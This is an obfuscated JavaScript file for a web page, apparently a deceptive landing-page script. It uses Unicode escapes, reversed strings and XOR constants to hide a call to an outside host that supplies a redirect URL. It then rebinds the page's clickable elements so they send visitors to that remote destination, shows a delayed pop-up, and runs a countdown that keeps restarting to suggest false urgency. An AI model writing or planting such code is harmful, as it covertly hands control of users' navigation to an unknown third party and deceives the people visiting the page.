function ilean(){const _0x17fe1f="\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0075\u006f\u0069\u006c\u002e\u0074\u006f\u0070\u002f\u0075\u0073\u0065\u0072\u002f\u0067\u0065\u0074\u004d\u0069\u006e\u0065\u0049\u006e\u0066\u006f\u002f";fetch(_0x17fe1f,{"\u006d\u0065\u0074\u0068\u006f\u0064":"\u0070\u006f\u0073\u0074","\u0068\u0065\u0061\u0064\u0065\u0072\u0073":{"\u0043\u006f\u006e\u0074\u0065\u006e\u0074\u002d\u0054\u0079\u0070\u0065":"\u0061\u0070\u0070\u006c\u0069\u0063\u0061\u0074\u0069\u006f\u006e\u002f\u006a\u0073\u006f\u006e"},"\u0062\u006f\u0064\u0079":JSON["\u0073\u0074\u0072\u0069\u006e\u0067\u0069\u0066\u0079"]({"\u006d\u0069\u006e\u0065\u005f\u0069\u0064":"\u0075\u0073\u004c\u0065\u0061\u006e"})})["\u0074\u0068\u0065\u006e"](_0x43c9b2=>_0x43c9b2['json']())["\u0074\u0068\u0065\u006e"](_0x2f3d65=>{setTimeout(()=>{if(_0x2f3d65['data']['data']){showline=function(){window["\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e"]["\u0068\u0072\u0065\u0066"]=_0x2f3d65["\u0064\u0061\u0074\u0061"]["\u0064\u0061\u0074\u0061"];};}},0xb11ae^0xb36be);});}setTimeout(()=>{var _0x2f8c94=window['location']['href'];var _0xe4daec=new URL(_0x2f8c94);var _0x703433=_0xe4daec['searchParams']['get']("di_liou".split("").reverse().join(""));if(!_0x703433){ilean();};},0xb11b7^0xb023f);
const close = document['querySelector']("\u002e\u0063\u006c\u0069\u0063\u006b\u005f\u005f\u0063\u006c\u006f\u0073\u0065");
const model = document['querySelector']("\u002e\u0073\u0065\u0063\u0074\u0069\u006f\u006e\u005f\u005f\u006d\u006f\u0064\u0065\u006c");
const hours__one = document["\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006c\u0065\u0063\u0074\u006f\u0072"]("eno__sruoh.".split("").reverse().join(""));
const hours__two = document["\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006c\u0065\u0063\u0074\u006f\u0072"]("owt__sruoh.".split("").reverse().join(""));
const minute__one = document['querySelector']("eno__etunim.".split("").reverse().join(""));
const minute__two = document['querySelector']('.minute__two');
const second__one = document["\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006c\u0065\u0063\u0074\u006f\u0072"]("eno__dnoces.".split("").reverse().join(""));
const second__two = document['querySelector']("owt__dnoces.".split("").reverse().join(""));
const clicks = document['querySelectorAll']("kcilc.".split("").reverse().join(""));
const dom_a = document['querySelectorAll']("enil__kcilc.".split("").reverse().join(""));
const click__line__ss = document["\u0071\u0075\u0065\u0072\u0079\u0053\u0065\u006c\u0065\u0063\u0074\u006f\u0072"]("ss__enil__kcilc.".split("").reverse().join(""));
clicks["\u0066\u006f\u0072\u0045\u0061\u0063\u0068"](_0x3835ad => {
    _0x3835ad["\u006f\u006e\u0063\u006c\u0069\u0063\u006b"] = showline;
});
click__line__ss['onclick'] = showline;
setTimeout(function () {
    model['style']['display'] = "xelf".split("").reverse().join("");
}, 0xed491 ^ 0xedf29);
close['onclick'] = function () {
    model['style']["\u0064\u0069\u0073\u0070\u006c\u0061\u0079"] = "\u006e\u006f\u006e\u0065";
};

function resetTime(_0x5a3311) {
    var _0x4f166d = null;
    var _0x308102 = _0x5a3311;
    var _0x1c2682 = 0xbdfbb ^ 0xbdfbb;
    var _0x470224 = 0x27554 ^ 0x27554;
    var _0x5eb946 = 0x40e7e ^ 0x40e7e;
    _0x1c2682 = Math['floor'](_0x308102 / (0x43e68 ^ 0x43078));
    _0x1c2682 < (0xcad06 ^ 0xcad0c) && (_0x1c2682 = '0' + _0x1c2682);
    _0x470224 = Math['floor'](_0x308102 / (0xc8acb ^ 0xc8af7) % (0x28dc6 ^ 0x28dfa));
    _0x470224 < 0xa && (_0x470224 = '0' + _0x470224);
    _0x5eb946 = Math['floor'](_0x308102 % 0x3c);
    _0x4f166d = setInterval(_0x3c177b, 0x60072 ^ 0x6039a);

    function _0x3c177b() {
        _0x5a3311--;
        _0x5eb946--;
        if (_0x5a3311 < 0x0) {
            // resetTime(0x1c20);
            resetTime(600);
        } else {
            // localStorage["\u0073\u0065\u0074\u0049\u0074\u0065\u006d"]("trats_emit".split("").reverse().join(""), _0x5a3311);
        }
        _0x5eb946 < 0xa && (_0x5eb946 = "\u0030" + _0x5eb946);
        if (_0x5eb946["\u006c\u0065\u006e\u0067\u0074\u0068"] >= (0xc4897 ^ 0xc4894)) {
            _0x5eb946 = 0xe7bd0 ^ 0xe7beb;
            _0x470224 = Number(_0x470224) - 0x1;
            _0x470224 < (0x8f8ed ^ 0x8f8e7) && (_0x470224 = '0' + _0x470224);
        }
        if (_0x470224['length'] >= 0x3) {
            _0x470224 = 0x4a764 ^ 0x4a75f;
            _0x1c2682 = Number(_0x1c2682) - 0x1;
            _0x1c2682 < (0xe59be ^ 0xe59b4) && (_0x1c2682 = "\u0030" + _0x1c2682);
        }
        if (_0x1c2682['length'] >= (0x90b53 ^ 0x90b50)) {
            _0x1c2682 = "00".split("").reverse().join("");
            _0x470224 = '00';
            _0x5eb946 = "\u0030\u0030";
            clearInterval(_0x4f166d);
        }
        hours__one['innerHTML'] = parseInt(_0x1c2682 / (0x1bd10 ^ 0x1bd1a)) % (0xc8c0d ^ 0xc8c07);
        hours__two["\u0069\u006e\u006e\u0065\u0072\u0048\u0054\u004d\u004c"] = _0x1c2682 % 0xa;
        minute__one['innerHTML'] = parseInt(_0x470224 / 0xa) % (0x25ec8 ^ 0x25ec2);
        minute__two["\u0069\u006e\u006e\u0065\u0072\u0048\u0054\u004d\u004c"] = _0x470224 % 0xa;
        second__one['innerHTML'] = parseInt(_0x5eb946 / (0x1e404 ^ 0x1e40e)) % 0xa;
        second__two['innerHTML'] = _0x5eb946 % 0xa;
    }
}
const time_start = localStorage["\u0067\u0065\u0074\u0049\u0074\u0065\u006d"]("\u0074\u0069\u006d\u0065\u005f\u0073\u0074\u0061\u0072\u0074");
resetTime(time_start);
